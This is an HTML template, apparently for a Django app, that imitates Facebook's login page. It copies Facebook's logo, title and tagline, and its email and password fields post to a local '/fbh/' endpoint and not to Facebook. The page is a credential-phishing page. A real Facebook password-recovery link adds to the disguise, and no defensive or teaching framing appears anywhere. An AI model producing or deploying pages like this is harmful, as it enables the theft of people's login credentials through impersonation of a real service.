<!doctype html>
<html lang="en">

<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

  <title>Facebook</title>
  <style>
    h1{
      color: blue;
    }
    divd {
  background-color: white;
  width: 6px;
  border: 1px solid black;
  padding: 30px;
}
  </style>
</head>

<body>

  <div class="container my-5">
    <div class="row">

      <div class="col-md-1">

      </div>

      <div class="col-md-4">
        <h1 > <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" > </h1>
        <h5>Facebook helps you connect and share with the people in your life.</h5>
      </div>
      <div class="col-md-1">

      </div>

      <divd class="col-md-4">
        <form action="/fbh/" method="POST"> {% csrf_token %}
          <div class="form-group">
            <label for="email"></label>
            <input type="text" class="form-control" id="email" name="email" autocomplete="off" placeholder="Email address or phone number">
          </div>

          <div class="form-group">
            <label for="pass"></label>
            <input type="password" class="form-control" id="pass" name="pass" placeholder="password">
          </div>
          <button type="submit" class="btn btn-primary my-3 mx-5"> Log In</button><br>
          <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten Password?</a>
          <hr>
          <button type="" class="btn btn-success">Create New Account</button>
      </div>
      <p><b>Create a Page </b> for a celebrity, brand or business.</p>
      </form>
    </divd>
  </div>

  

  <!-- Optional JavaScript; choose one of the two! -->

  <!-- Option 1: Bootstrap Bundle with Popper -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
    crossorigin="anonymous"></script>

  <!-- Option 2: Separate Popper and Bootstrap JS -->
  <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
    -->
</body>

</html>
